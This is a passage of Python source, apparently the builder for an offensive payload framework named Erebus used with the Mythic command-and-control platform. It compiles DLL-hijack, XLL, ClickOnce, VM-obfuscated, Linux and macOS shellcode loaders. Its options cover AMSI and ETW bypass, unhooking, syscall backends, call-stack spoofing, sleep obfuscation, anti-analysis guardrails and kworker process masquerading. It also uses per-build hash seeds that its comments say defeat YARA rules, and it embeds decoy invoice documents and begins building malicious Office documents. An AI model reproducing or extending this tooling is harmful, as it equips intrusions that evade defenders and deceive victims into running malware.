                    await self._build_step("[T1036] - Configuring DLL Hijack Loader", 
                                           "Generated config.hpp with encryption/compression settings", 
                                           success=True)
                except Exception as e:
                    await self._fail_step(response, "[T1036] - Configuring DLL Hijack Loader",
                        f"Failed to render Hijack config: {str(e)}",
                        f"Failed to render config.hpp: {str(e)}")
                    return response

                # DLL Hijack compilation.
                # EREBUS_HASH_SEED is a per-build random 32-bit constant that
                # reseeds the compile-time API hash function, so every built
                # loader has unique hash values for GetProcAddress targets.
                # Defeats family-level YARA pinned on fixed hash constants.
                _hash_seed = f"0x{secrets.randbits(32):08X}"
                _sw3 = {"SysWhispers3": 1, "Heaven's Gate": 2}.get(self.get_parameter("0.5m Syscall Backend"), 0)
                _cs  = 1 if self.get_parameter("0.5n Callstack Spoofing") else 0
                cmd = [
                    "make",
                    "-C",
                    shellcode_loader_path,
                    f"ARCH={self.get_parameter('1.0a Hijack Loader Architecture')}",
                    f"BUILD={self.get_parameter('1.0b Hijack Build Configuration')}",
                    "TARGET=dll",
                    # Hijack DLL is already running inside the victim - force
                    # CreateFiber self-injection. Without this the Makefile
                    # default (INJECTION_TYPE=3 / EarlyCascade) wins via its
                    # -DCONFIG_INJECTION_TYPE define, which short-circuits the
                    # `#ifndef CONFIG_INJECTION_TYPE` guard in config.hpp and
                    # routes the loader into the remote CreateProcessW path
                    # with an empty CONFIG_TARGET_PROCESS - the suspended
                    # process spawn then fails and no shellcode runs.
                    "INJECTION_TYPE=2",
                    f"EREBUS_HASH_SEED={_hash_seed}",
                    f"CONFIG_SYSCALL_BACKEND={_sw3}",
                    f"CONFIG_CALLSTACK_SPOOF_ENABLED={_cs}",
                    "CONFIG_SLEEP_OBFUSCATION_TYPE=0",
                    "all"
                ]
                compile_step_name = "[T1027.011] - Compiling DLL Payload"
                compile_step_msg = "DLL Loader Compiled!"
                payload_output_file = f"{shellcode_loader_path}/erebus.dll"
                payload_final_name = dll_file_name  # Use the actual DLL filename

            elif payload_type == "Loader":
                loader_type = self.get_parameter("0.1 Loader Type")

                if loader_type == "Shellcode Loader":
                    # Configure guardrails for Shellcode Loader
                    guardrail_template = environment.get_template("guardrail.hpp")
                    guardrails_enabled = self.get_parameter("0.5a Enable Guardrails")
                    guardrail_data = {
                        "use_builtin_guardrails": guardrails_enabled,
                        "check_debugger": self.get_parameter("0.5b Check IsDebuggerPresent") if guardrails_enabled else False,
                        "check_remote_debugger": self.get_parameter("0.5c Check Remote Debugger") if guardrails_enabled else False,
                        "check_debugger_processes": self.get_parameter("0.5d Check Debugger Processes") if guardrails_enabled else False,
                        "check_hardware_breakpoints": self.get_parameter("0.5e Check Hardware Breakpoints") if guardrails_enabled else False,
                        "check_timing": self.get_parameter("0.5f Check Timing Anomalies") if guardrails_enabled else False,
                        "allowed_hostnames": parse_csv(self.get_parameter("0.5g Hostname Whitelist")) if guardrails_enabled else [],
                        "blocked_hostnames": parse_csv(self.get_parameter("0.5h Block Analysis Hostnames")) if guardrails_enabled else [],
                        "blocked_usernames": parse_csv(self.get_parameter("0.5i Block Analysis Usernames")) if guardrails_enabled else [],
                        "allowed_ips": parse_csv(self.get_parameter("0.5j IP Whitelist")) if guardrails_enabled else [],
                        "blocked_ips": parse_csv(self.get_parameter("0.5k IP Blacklist")) if guardrails_enabled else [],
                        "allowed_domains": parse_csv(self.get_parameter("0.5l Domain Whitelist")) if guardrails_enabled else [],
                    }
                    guardrail_output = guardrail_template.render(**guardrail_data)
                    guardrail_hpp_path = PurePath(shellcode_loader_path) / "include" / "guardrail.hpp"
                    with open(str(guardrail_hpp_path), "w") as file:
                        file.write(guardrail_output)

                    build_config = self.get_parameter('0.3 Loader Build Configuration')

                    # Handle test build configuration
                    if build_config == "test":
                        cmd = [
                            "make",
                            "-C",
                            shellcode_loader_path,
                            "test-all-payloads"
                        ]
                        compile_step_name = "[T1027] - Compiling Test Payloads"
                        compile_step_msg = "All test payloads compiled!"
                        # For test builds, we'll zip all payloads from the payloads directory
                        payload_output_file = f"{shellcode_loader_path}/payloads"
                        payload_final_name = "test_payloads.zip"
                    else:
                        loader_format = self.get_parameter('0.2 Loader Format')
                        _hash_seed = f"0x{secrets.randbits(32):08X}"
                        _sw3 = {"SysWhispers3": 1, "Heaven's Gate": 2}.get(self.get_parameter("0.5m Syscall Backend"), 0)
                        _cs  = 1 if self.get_parameter("0.5n Callstack Spoofing") else 0
                        _so_type = {"None": 0, "Timer": 1, "Ekko-lite": 2, "Exhaustion": 3}.get(
                            self.get_parameter("0.5p Sleep Obfuscation"), 0)
                        _so_base = int(self.get_parameter("0.5q Sleep Base MS") or 5000)
                        _so_jitt = int(self.get_parameter("0.5r Sleep Jitter MS") or 3000)
                        _amsi    = int(self.get_parameter("0.5s AMSI Bypass Type") or 1)
                        _etw     = int(self.get_parameter("0.5t ETW Bypass Type") or 1)
                        _unhook  = int(self.get_parameter("0.5u Unhook Scope") or 1)
                        cmd = [
                            "make",
                            "-C",
                            shellcode_loader_path,
                            f"ARCH={self.get_parameter('0.2a Loader Architecture')}",
                            f"TARGET={loader_format}",
                            f"BUILD={build_config}",
                            f"INJECTION_TYPE={self.get_parameter('0.4 Shellcode Loader - Injection Type')}",
                            f"EREBUS_HASH_SEED={_hash_seed}",
                            f"CONFIG_SYSCALL_BACKEND={_sw3}",
                            f"CONFIG_CALLSTACK_SPOOF_ENABLED={_cs}",
                            f"CONFIG_SLEEP_OBFUSCATION_TYPE={_so_type}",
                            f"CONFIG_SLEEP_OBFUSCATION_BASE_MS={_so_base}",
                            f"CONFIG_SLEEP_OBFUSCATION_JITTER_MS={_so_jitt}",
                            f"CONFIG_AMSI_BYPASS_TYPE={_amsi}",
                            f"CONFIG_ETW_BYPASS_TYPE={_etw}",
                            f"CONFIG_UNHOOK_SCOPE={_unhook}",
                            "all"
                        ]
                        if loader_format == "dll":
                            compile_step_name = "[T1027.011] - Compiling DLL Payload"
                            compile_step_msg = "DLL Loader Compiled!"
                        elif loader_format == "xll":
                            compile_step_name = "[T1559.002] - Compiling XLL Add-In"
                            compile_step_msg = "XLL Add-In Compiled!"

                            # XLL File Ingestor: embed a legitimate document that is
                            # dropped to %TEMP% and opened when xlAutoOpen fires.
                            _xll_ingest_uuid = self.get_parameter("0.2b XLL Ingest File")
                            if _xll_ingest_uuid:
                                try:
                                    _ingest_resp = await SendMythicRPCFileGetContent(
                                        MythicRPCFileGetContentMessage(AgentFileId=_xll_ingest_uuid)
                                    )
                                    if _ingest_resp.Success and _ingest_resp.Content:
                                        _ingest_bytes = _ingest_resp.Content

                                        # Operator-chosen drop filename (e.g. "Q2_Invoice.xlsx").
                                        _ingest_fname = (
                                            self.get_parameter("0.2c XLL Ingest Filename") or "document.xlsx"
                                        ).strip()
                                        if not _ingest_fname:
                                            _ingest_fname = "document.xlsx"

                                        # Sanitise: no path separators, no quotes.
                                        _ingest_fname = _ingest_fname.replace("/", "_").replace("\\", "_").replace('"', "")

                                        # Convert bytes to C hex array and write
                                        # the generated header (includes filename
                                        # define so no shell-quoting gymnastics
                                        # are needed on the make command line).
                                        _hex_vals = ", ".join(f"0x{b:02X}" for b in _ingest_bytes)
                                        _ingest_header = (
                                            "#ifndef EREBUS_XLL_INGEST_FILE_HPP\n"
                                            "#define EREBUS_XLL_INGEST_FILE_HPP\n"
                                            "#pragma once\n"
                                            "// Auto-generated by Erebus builder.py\n"
                                            f'#define CONFIG_XLL_INGEST_FILENAME "{_ingest_fname}"\n'
                                            f"static const unsigned char xll_ingest_file_data[] = {{ {_hex_vals} }};\n"
                                            f"static const unsigned long xll_ingest_file_size   = {len(_ingest_bytes)};\n"
                                            "#endif\n"
                                        )
                                        _ingest_hdr_path = (
                                            Path(shellcode_loader_path) / "include" / "xll_ingest_file.hpp"
                                        )
                                        _ingest_hdr_path.write_text(_ingest_header)

                                        cmd.insert(-1, "CONFIG_XLL_FILE_INGESTOR_ENABLED=1")
                                        output += f"[+] XLL ingest file embedded: {_ingest_fname} ({len(_ingest_bytes)} bytes)\n"
                                    else:
                                        output += "[WARN] Failed to retrieve XLL ingest file content — ingestor disabled.\n"
                                except Exception as _ie:
                                    output += f"[WARN] XLL ingest file error: {_ie} — ingestor disabled.\n"
                        else:
                            compile_step_name = "[T1027] - Compiling Shellcode Loader"
                            compile_step_msg = "Shellcode Loader Compiled!"
                        payload_output_file = f"{shellcode_loader_path}/erebus.{loader_format}"
                        payload_final_name = f"erebus.{loader_format}"

                elif loader_type == "ClickOnce":
                    build_config = self.get_parameter('0.3 ClickOnce Build Configuration')
                    arch = self.get_parameter('0.3a ClickOnce Architecture') or "x64"
                    rid = f"win-{arch}"

                    cmd = [
                        "make",
                        "-C",
                        clickonce_loader_path,
                        f"CONFIG={build_config}",
                        f"RID={rid}",
                        "publish"
                    ]
                    compile_step_name = "[T1027] - Compiling ClickOnce Loader"
                    compile_step_msg = "ClickOnce Loader Compiled!"
                    payload_output_file = None  # Will be determined from publish directory
                    payload_final_name = "erebus.exe"

                elif loader_type == "VM Loader":
                    loader_format = self.get_parameter('0.2 Loader Format')
                    build_config = self.get_parameter('0.3 Loader Build Configuration')
                    _hash_seed = f"0x{secrets.randbits(32):08X}"
                    _sw3 = {"SysWhispers3": 1, "Heaven's Gate": 2}.get(self.get_parameter("0.5m Syscall Backend"), 0)
                    _so_type = {"None": 0, "Timer": 1, "Ekko-lite": 2, "Exhaustion": 3}.get(
                        self.get_parameter("0.5p Sleep Obfuscation"), 0)
                    inj = self.get_parameter('0.4a VM Loader - Injection Type') or "2"
                    _amsi    = int(self.get_parameter("0.5s AMSI Bypass Type") or 1)
                    _etw     = int(self.get_parameter("0.5t ETW Bypass Type") or 0)
                    _unhook  = int(self.get_parameter("0.5u Unhook Scope") or 0)
                    _so_base = int(self.get_parameter("0.5q Sleep Base MS") or 5000)
                    _so_jitt = int(self.get_parameter("0.5r Sleep Jitter MS") or 3000)

                    # Per-build randomised VM parameters.
                    # VM_IR_SEED: 32-bit XOR key derivation seed.
                    # VM_FWD_*: random permutation of [0..7] for opcode encoding.
                    # VM_KEY_BASE_*: random 6-byte key derivation base.
                    # All values passed to BOTH the embedded build step and the
                    # final compile so vmloader_builder.cpp and vmloader.hpp use
                    # identical parameters — seed mismatch = corrupted payload.
                    _vm_seed  = f"0x{secrets.randbits(32):08X}U"
                    import random as _rnd
                    _vm_fwd   = list(range(8))
                    _rnd.shuffle(_vm_fwd)
                    _vm_key   = [secrets.randbits(8) for _ in range(6)]

                    _vm_random_args = [
                        f"VM_IR_SEED={_vm_seed}",
                        f"VM_FWD_0={_vm_fwd[0]}",
                        f"VM_FWD_1={_vm_fwd[1]}",
                        f"VM_FWD_2={_vm_fwd[2]}",
                        f"VM_FWD_3={_vm_fwd[3]}",
                        f"VM_FWD_4={_vm_fwd[4]}",
                        f"VM_FWD_5={_vm_fwd[5]}",
                        f"VM_FWD_6={_vm_fwd[6]}",
                        f"VM_FWD_7={_vm_fwd[7]}",
                        f"VM_KEY_BASE_0={hex(_vm_key[0])}",
                        f"VM_KEY_BASE_1={hex(_vm_key[1])}",
                        f"VM_KEY_BASE_2={hex(_vm_key[2])}",
                        f"VM_KEY_BASE_3={hex(_vm_key[3])}",
                        f"VM_KEY_BASE_4={hex(_vm_key[4])}",
                        f"VM_KEY_BASE_5={hex(_vm_key[5])}",
                        f"VM_SLEEP_BASE_MS={_so_base}",
                        f"VM_SLEEP_JITTER_MS={_so_jitt}",
                    ]

                    embedded_proc = await asyncio.create_subprocess_exec(
                        "make", "-C", vmloader_path, "embedded",
                        *_vm_random_args,
                        stdout=asyncio.subprocess.PIPE,
                        stderr=asyncio.subprocess.PIPE,
                    )
                    emb_out, emb_err = await embedded_proc.communicate()
                    if emb_out:
                        output += f"[embedded stdout]\n{emb_out.decode(errors='replace')}"
                    if emb_err:
                        output += f"[embedded stderr]\n{emb_err.decode(errors='replace')}"
                    if embedded_proc.returncode != 0:
                        response.status = BuildStatus.Error
                        response.build_message = "VM Loader: failed to generate embedded.h"
                        response.build_stderr = output
                        await self._build_step("[T1027] - VM Loader embedded.h", "Failed to generate embedded.h", success=False)
                        return response

                    cmd = [
                        "make",
                        "-C",
                        vmloader_path,
                        f"ARCH={self.get_parameter('0.2a Loader Architecture')}",
                        f"TARGET={loader_format}",
                        f"BUILD={build_config}",
                        f"INJECTION_TYPE={inj}",
                        f"EREBUS_HASH_SEED={_hash_seed}",
                        f"CONFIG_SYSCALL_BACKEND={_sw3}",
                        f"CONFIG_SLEEP_OBFUSCATION_TYPE={_so_type}",
                        f"CONFIG_AMSI_BYPASS_TYPE={_amsi}",
                        f"CONFIG_ETW_BYPASS_TYPE={_etw}",
                        f"CONFIG_UNHOOK_SCOPE={_unhook}",
                        *_vm_random_args,
                        "all"
                    ]
                    if loader_format == "dll":
                        compile_step_name = "[T1027.011] - Compiling VM Loader DLL"
                        compile_step_msg = "VM Loader DLL Compiled!"
                    elif loader_format == "xll":
                        compile_step_name = "[T1559.002] - Compiling VM Loader XLL"
                        compile_step_msg = "VM Loader XLL Compiled!"
                    else:
                        compile_step_name = "[T1027] - Compiling VM Loader"
                        compile_step_msg = "VM Loader Compiled!"
                    payload_output_file = f"{vmloader_path}/erebus_vm.{loader_format}"
                    payload_final_name = f"erebus_vm.{loader_format}"

            elif payload_type == "Linux":
                _lnx_fmt   = {"ELF": "elf", "Shared Object": "so"}.get(
                    self.get_parameter("0.1-L Linux Loader Type"), "elf")
                _lnx_arch  = self.get_parameter("0.2a-L Linux Architecture") or "x86_64"
                _lnx_build = self.get_parameter("0.3-L Linux Build Configuration") or "release"
                _lnx_inj   = self.get_parameter("0.4-L Linux Injection Type") or "2"
                _lnx_gr    = 1 if self.get_parameter("0.5-L Linux Enable Guardrails") else 0
                _lnx_ptrace= 1 if self.get_parameter("0.5a-L Linux Check ptrace") else 0
                _lnx_cgrp  = 1 if self.get_parameter("0.5b-L Linux Check Container") else 0
                _lnx_masq  = 1 if self.get_parameter("0.5e-L Linux Process Masquerade") else 0
                _lnx_mname = self.get_parameter("0.5f-L Linux Masquerade Name") or "[kworker/u:0]"

                cmd = [
                    "make", "-C", nix_loader_path,
                    f"ARCH={_lnx_arch}",
                    f"TARGET={_lnx_fmt}",
                    f"BUILD={_lnx_build}",
                    f"INJECTION_TYPE={_lnx_inj}",
                    f"CONFIG_GUARDRAILS_ENABLED={_lnx_gr}",
                    f"CONFIG_CHECK_PTRACE={_lnx_ptrace}",
                    f"CONFIG_CHECK_CGROUP={_lnx_cgrp}",
                    f"CONFIG_MASQUERADE_ENABLED={_lnx_masq}",
                    f"CONFIG_MASQUERADE_NAME={_lnx_mname}",
                ]

                if _lnx_gr:
                    _bh = parse_csv(self.get_parameter("0.5c-L Linux Blocked Hostnames") or "")
                    if _bh:
                        cmd.append(
                            "CONFIG_BLOCKED_HOSTNAMES={"
                            + ",".join(f'\\"{h}\\"' for h in _bh)
                            + "}"
                        )
                    _bu = parse_csv(self.get_parameter("0.5d-L Linux Blocked Usernames") or "")
                    if _bu:
                        cmd.append(
                            "CONFIG_BLOCKED_USERNAMES={"
                            + ",".join(f'\\"{u}\\"' for u in _bu)
                            + "}"
                        )

                cmd.append("all")

                _lnx_out_ext = ".so" if _lnx_fmt == "so" else ""
                compile_step_name  = "[T1059.004] - Compiling Linux Shellcode Loader"
                compile_step_msg   = f"Linux {'Shared Object' if _lnx_out_ext else 'ELF'} loader compiled!"
                payload_output_file = f"{nix_loader_path}/erebus_nix{_lnx_out_ext}"
                payload_final_name  = f"erebus_nix{_lnx_out_ext}"

            elif payload_type == "macOS":
                _mac_fmt   = {"MachO": "macho", "Dylib": "dylib"}.get(
                    self.get_parameter("0.1-M macOS Loader Type"), "macho")
                _mac_arch  = self.get_parameter("0.2a-M macOS Architecture") or "x86_64"
                _mac_build = self.get_parameter("0.3-M macOS Build Configuration") or "release"
                _mac_inj   = self.get_parameter("0.4-M macOS Injection Type") or "1"
                _mac_gr    = 1 if self.get_parameter("0.5-M macOS Enable Guardrails") else 0
                _mac_da    = 1 if self.get_parameter("0.5a-M macOS Deny Attach") else 0
                _mac_dbg   = 1 if self.get_parameter("0.5b-M macOS Check Debug") else 0
                _mac_time  = 1 if self.get_parameter("0.5c-M macOS Check Timing") else 0

                cmd = [
                    "make", "-C", mac_loader_path,
                    f"ARCH={_mac_arch}",
                    f"TARGET={_mac_fmt}",
                    f"BUILD={_mac_build}",
                    f"INJECTION_TYPE={_mac_inj}",
                    f"CONFIG_GUARDRAILS_ENABLED={_mac_gr}",
                    f"CONFIG_DENY_ATTACH={_mac_da}",
                    f"CONFIG_CHECK_DEBUG={_mac_dbg}",
                    f"CONFIG_CHECK_TIMING={_mac_time}",
                ]

                if _mac_gr:
                    _bh = parse_csv(self.get_parameter("0.5d-M macOS Blocked Hostnames") or "")
                    if _bh:
                        cmd.append(
                            "CONFIG_BLOCKED_HOSTNAMES={"
                            + ",".join(f'\\"{h}\\"' for h in _bh)
                            + "}"
                        )
                    _bu = parse_csv(self.get_parameter("0.5e-M macOS Blocked Usernames") or "")
                    if _bu:
                        cmd.append(
                            "CONFIG_BLOCKED_USERNAMES={"
                            + ",".join(f'\\"{u}\\"' for u in _bu)
                            + "}"
                        )

                cmd.append("all")

                _mac_out_ext = ".dylib" if _mac_fmt == "dylib" else ""
                compile_step_name  = "[T1059.004] - Compiling macOS Shellcode Loader"
                compile_step_msg   = f"macOS {'Dylib' if _mac_out_ext else 'Mach-O'} loader compiled!"
                payload_output_file = f"{mac_loader_path}/erebus_mac{_mac_out_ext}"
                payload_final_name  = f"erebus_mac{_mac_out_ext}"

            # Execute compilation
            process = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, stderr = await process.communicate()

            if stdout:
                output += f"[stdout]\n{stdout.decode(errors='replace')}"
            if stderr:
                output += f"[stderr]\n{stderr.decode(errors='replace')}"

            # Handle compilation output
            if payload_type == "Hijack":
                payload_path = PurePath(agent_build_path) / "payload" / payload_final_name
                payload_path = str(payload_path)

                if process.returncode != 0:
                    response.status = BuildStatus.Error
                    response.payload = b""
                    response.build_message = "Failed to compile DLL"
                    response.build_stderr = output
                    await self._build_step(compile_step_name, "Failed to Compile DLL Payload", success=False)
                    return response

                shutil.copy(dst=payload_path, src=payload_output_file)

                # Skip PE sanitize + self-hunt on debug builds - see
                # _finalize_pe_artifact for the rationale.
                _hijack_build_config = self.get_parameter("1.0b Hijack Build Configuration") or "release"
                output += _finalize_pe_artifact(
                    payload_path,
                    str(PurePath(agent_build_path) / "payload"),
                    build_config=_hijack_build_config,
                )

                if os.path.exists(payload_path):
                    response.status = BuildStatus.Success
                    response.build_message = "DLL Compiled!"
                    response.build_stdout = output + "\n" + payload_path
                    await self._build_step(compile_step_name, compile_step_msg, success=True)
                else:
                    response.status = BuildStatus.Error
                    response.payload = b""
                    response.build_message = "Failed to compile DLL"
                    response.build_stderr = output + "\n" + payload_path
                    await self._build_step(compile_step_name, "Failed to Compile DLL Payload", success=False)
                    return response

            elif payload_type == "Loader":
                loader_type = self.get_parameter("0.1 Loader Type")

                if loader_type == "Shellcode Loader":
                    build_config = self.get_parameter('0.3 Loader Build Configuration')

                    # Handle test build - create zip of all test payloads
                    if build_config == "test":
                        payloads_dir = Path(payload_output_file)  # payload_output_file contains path to payloads directory

                        output += f"[DEBUG] Payloads directory: {payloads_dir}\n"
                        output += f"[DEBUG] Payloads directory exists: {payloads_dir.exists()}\n"

                        if payloads_dir.exists():
                            files_in_dir = list(payloads_dir.iterdir())
                            output += f"[DEBUG] Files in payloads directory: {[f.name for f in files_in_dir]}\n"

                        if not payloads_dir.exists() or not any(payloads_dir.iterdir()):
                            response.status = BuildStatus.Error
                            response.build_message = "Failed to compile test payloads"
                            response.build_stderr = output + f"\nPayloads directory not found or empty: {payloads_dir}"
                            await self._build_step(compile_step_name, "Failed to Compile Test Payloads", success=False)
                            return response

                        # Create agent_code/payloads directory for persistent storage
                        agent_code_payloads_dir = Path(__file__).resolve().parent.parent / "agent_code" / "payloads"
                        agent_code_payloads_dir.mkdir(parents=True, exist_ok=True)

                        # Create zip file using shutil
                        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                        zip_basename = f"test_payloads_{timestamp}"

                        # Use shutil.make_archive to create zip (it adds .zip automatically)
                        # This creates the zip in the parent directory of payloads_dir
                        zip_archive_path = shutil.make_archive(
                            base_name=str(payloads_dir.parent / zip_basename),
                            format='zip',
                            root_dir=str(payloads_dir.parent),
                            base_dir=payloads_dir.name
                        )

                        output += f"[DEBUG] Created archive at: {zip_archive_path}\n"
                        output += f"[DEBUG] Archive size: {os.path.getsize(zip_archive_path)} bytes\n"

                        # Move the zip to agent_code/payloads
                        final_zip_path = agent_code_payloads_dir / f"{zip_basename}.zip"
                        shutil.move(zip_archive_path, str(final_zip_path))

                        output += f"[DEBUG] Moved archive to: {final_zip_path}\n"

                        # Also copy individual payloads to agent_code/payloads for easy access
                        files_copied = 0
                        for file in payloads_dir.iterdir():
                            if file.is_file():
                                shutil.copy(file, agent_code_payloads_dir / file.name)
                                files_copied += 1

                        output += f"[DEBUG] Copied {files_copied} individual files\n"

                        if os.path.exists(final_zip_path) and os.path.getsize(final_zip_path) > 0:
                            response.status = BuildStatus.Success
                            response.build_message = f"Test payloads compiled and saved to agent_code/payloads/!"
                            response.build_stdout = output + f"\nZip: {final_zip_path}\nIndividual files also copied\nContains {files_copied} test payloads"
                            await self._build_step(compile_step_name, f"{compile_step_msg} Saved {files_copied} payloads to {agent_code_payloads_dir}", success=True)

                            # For test builds, read the zip and return it as the payload
                            with open(final_zip_path, "rb") as f:
                                response.payload = f.read()
                            response.updated_filename = f"{zip_basename}.zip"

                            # Return early for test builds - skip containerization and other steps
                            return response
                        else:
                            response.status = BuildStatus.Error
                            response.build_message = f"Failed to create test payload zip"
                            response.build_stderr = output + "\n" + str(final_zip_path)
                            await self._build_step(compile_step_name, f"Failed to package test payloads", success=False)
                            return response
                    else:
                        payload_path = PurePath(agent_build_path) / "payload" / payload_final_name
                        payload_path = str(payload_path)
                        shutil.copy(dst=payload_path, src=payload_output_file)

                        # build_config was resolved at the top of this
                        # branch (Shellcode Loader, non-test). Threaded
                        # into the finalizer so debug builds skip the
                        # sanitizer/self_hunt pair.
                        output += _finalize_pe_artifact(
                            payload_path,
                            str(PurePath(agent_build_path) / "payload"),
                            build_config=build_config,
                        )

                        if os.path.exists(payload_path):
                            response.status = BuildStatus.Success
                            response.build_message = "Loader Compiled!"
                            response.build_stdout = output + "\n" + payload_path
                            await self._build_step(compile_step_name, compile_step_msg, success=True)
                        else:
                            response.status = BuildStatus.Error
                            response.build_message = "Failed to compile loader"
                            response.build_stderr = output + "\n" + payload_path
                            await self._build_step(compile_step_name, "Failed to Compile Shellcode Loader", success=False)
                            return response

                elif loader_type == "ClickOnce":
                    if process.returncode != 0:
                        response.status = BuildStatus.Error
                        response.build_message = f"Makefile publish target failed with exit code {process.returncode}"
                        response.build_stderr = output
                        await self._build_step(compile_step_name, f"Makefile publish failed", success=False)
                        return response

                    # Locate publish output
                    build_config = self.get_parameter('0.3 ClickOnce Build Configuration')
                    publish_root = Path(clickonce_loader_path) / "bin" / build_config

                    publish_dir = None
                    if publish_root.exists():
                        for tfm_dir in publish_root.iterdir():
                            if tfm_dir.is_dir() and "net" in tfm_dir.name and "-windows" in tfm_dir.name:
                                for rid_dir in tfm_dir.iterdir():
                                    if rid_dir.is_dir():
                                        candidate = rid_dir / "publish"
                                        if candidate.exists():
                                            publish_dir = candidate
                                            break
                                if publish_dir:
                                    break

                    if not publish_dir or not publish_dir.exists():
                        response.status = BuildStatus.Error
                        response.build_message = "Failed to locate ClickOnce publish output directory"
                        response.build_stderr = output + f"\nSearched in: {publish_root}"
                        await self._build_step(compile_step_name, "Failed to locate ClickOnce publish output", success=False)
                        return response

                    # Copy cleaned artifacts from publish directory (skip the main exe - renamed below)
                    payload_dir = Path(agent_build_path) / "payload"
                    payload_dir.mkdir(parents=True, exist_ok=True)

                    CLICKONCE_MAIN = {"Erebus.ClickOnce.exe", "Erebus.ClickOnce.dll"}
                    for item in publish_dir.iterdir():
                        if item.is_file() and item.name not in CLICKONCE_MAIN:
                            dest_path = payload_dir / item.name
                            shutil.copy2(str(item), str(dest_path))

                    output += f"[DEBUG] Cleaned publish artifacts:\n"
                    for item in publish_dir.iterdir():
                        if item.is_file():
                            output += f"  - {item.name} ({item.stat().st_size} bytes)\n"

                    # Locate main executable and copy as erebus.exe / erebus.dll
                    payload_path = PurePath(agent_build_path) / "payload" / payload_final_name
                    payload_path = str(payload_path)

                    clickonce_exe = publish_dir / "Erebus.ClickOnce.exe"
                    clickonce_dll = publish_dir / "Erebus.ClickOnce.dll"

                    if clickonce_exe.exists():
                        shutil.copy2(str(clickonce_exe), str(payload_path))
                        response.build_stdout = output + f"\nClickOnce Loader compiled to: {payload_path}"
                        response.status = BuildStatus.Success
                        response.build_message = "ClickOnce Loader compiled successfully!"
                    elif clickonce_dll.exists():
                        payload_path_dll = Path(payload_path).with_suffix(".dll")
                        shutil.copy2(str(clickonce_dll), str(payload_path_dll))
                        response.build_stdout = output + f"\nClickOnce Loader compiled to: {payload_path_dll}"
                        response.status = BuildStatus.Success
                        response.build_message = "ClickOnce Loader compiled successfully!"
                    else:
                        response.status = BuildStatus.Error
                        response.build_message = "Failed to locate compiled ClickOnce executable"
                        response.build_stderr = output + "\nNo .exe or .dll found in publish directory"
                        await self._build_step(compile_step_name, "Failed to locate executable", success=False)
                        return response

                    await self._build_step(compile_step_name, compile_step_msg, success=True)

                elif loader_type == "VM Loader":
                    payload_path = PurePath(agent_build_path) / "payload" / payload_final_name
                    payload_path = str(payload_path)
                    shutil.copy(dst=payload_path, src=payload_output_file)

                    build_config = self.get_parameter('0.3 Loader Build Configuration')
                    output += _finalize_pe_artifact(
                        payload_path,
                        str(PurePath(agent_build_path) / "payload"),
                        build_config=build_config,
                    )

                    if os.path.exists(payload_path):
                        response.status = BuildStatus.Success
                        response.build_message = "VM Loader Compiled!"
                        response.build_stdout = output + "\n" + payload_path
                        await self._build_step(compile_step_name, compile_step_msg, success=True)
                    else:
                        response.status = BuildStatus.Error
                        response.build_message = "Failed to compile VM Loader"
                        response.build_stderr = output + "\n" + payload_path
                        await self._build_step(compile_step_name, "Failed to Compile VM Loader", success=False)
                        return response

            elif payload_type in ("Linux", "macOS"):
                payload_path = PurePath(agent_build_path) / "payload" / payload_final_name
                payload_path = str(payload_path)

                if not os.path.exists(payload_output_file):
                    response.status = BuildStatus.Error
                    response.build_message = f"Compilation failed - output not found: {payload_output_file}"
                    response.build_stderr = output
                    await self._build_step(compile_step_name, f"Compilation failed", success=False)
                    return response

                shutil.copy(dst=payload_path, src=payload_output_file)

                if os.path.exists(payload_path):
                    response.status = BuildStatus.Success
                    response.build_message = compile_step_msg
                    response.build_stdout = output + "\n" + payload_path
                    await self._build_step(compile_step_name, compile_step_msg, success=True)
                else:
                    response.status = BuildStatus.Error
                    response.build_message = f"Failed to copy loader to payload dir"
                    response.build_stderr = output + "\n" + payload_path
                    await self._build_step(compile_step_name, f"Failed to stage loader", success=False)
                    return response

            output = ""
            ######################### End Of Payload Build Section #########################
            ######################### Code Signing Section #########################
            # R3b: dispatch into _apply_codesign() - see its docstring for
            # the mode matrix. Method returns False on failure and has
            # already populated response.status/build_stderr, so we just
            # propagate the error response upward.
            if not await self._apply_codesign(agent_build_path, dll_file_name, response):
                return response

            ######################### Creating Decoy Section #########################
            if self.get_parameter("0.13 Decoy File Inclusion"):
                decoy_dir = Path(agent_build_path) / "decoys"
                decoy_file_uuid = self.get_parameter("0.13 Decoy File")

                if decoy_file_uuid:
                    try:
                        file_resp = await SendMythicRPCFileGetContent(
                            MythicRPCFileGetContentMessage(AgentFileId=decoy_file_uuid)
                        )

                        file_name_resp = await SendMythicRPCFileSearch(
                            MythicRPCFileSearchMessage(AgentFileID=decoy_file_uuid)
                        )
                        custom_filename = "decoy.pdf"
                        if file_name_resp.Success and len(file_name_resp.Files) > 0:
                            custom_filename = file_name_resp.Files[0].Filename

                        if decoy_dir.exists():
                            shutil.rmtree(decoy_dir)
                        decoy_dir.mkdir(parents=True, exist_ok=True)
                        custom_decoy_path = decoy_dir / custom_filename
                        custom_decoy_path.write_bytes(file_resp.Content)

                        await self._build_step("[T1036.008] - Creating Decoy", f"Replaced default decoys with custom file: {custom_filename}", success=True)

                    except Exception as e:
                        await self._build_step("[T1036.008] - Creating Decoy", f"Failed to process custom decoy: {str(e)}", success=False)
                else:
                    await self._build_step("[T1036.008] - Creating Decoy", "Using default decoy files.", success=True)
            ######################### End of Decoy Section #########################
            ######################### MalDoc Creation Section #########################
            maldoc_mode = self.get_parameter("0.9 Create MalDoc")

            if maldoc_mode != "None" and self.get_parameter("0.8 Output Extension Source") == "Trigger":
                await self._build_step("[T1566.001] - Creating MalDoc", "Skipping MalDoc Generation (Trigger selected as source).", success=True)

            ######################### MalDoc Matrix Branch #########################
            if maldoc_mode == "Build Matrix" and self.get_parameter("0.8 Output Extension Source") != "Trigger":
                payload_dir    = Path(agent_build_path) / "payload"
                doc_name       = self.get_parameter("0.9d Excel Document Name")
                obfuscate      = self.get_parameter("0.9e Obfuscate VBA")
                target_process = self.get_parameter("0.5 Shellcode Loader - Target Process")

                _raw_loaders  = self.get_parameter("0.9r Matrix Loaders") or ""
                _raw_triggers = self.get_parameter("0.9s Matrix Triggers") or ""
                _raw_formats  = self.get_parameter("0.9t Matrix Formats")  or ""
                matrix_loaders  = [x.strip() for x in _raw_loaders.split(",")  if x.strip()] or None
                matrix_triggers = [x.strip() for x in _raw_triggers.split(",") if x.strip()] or None
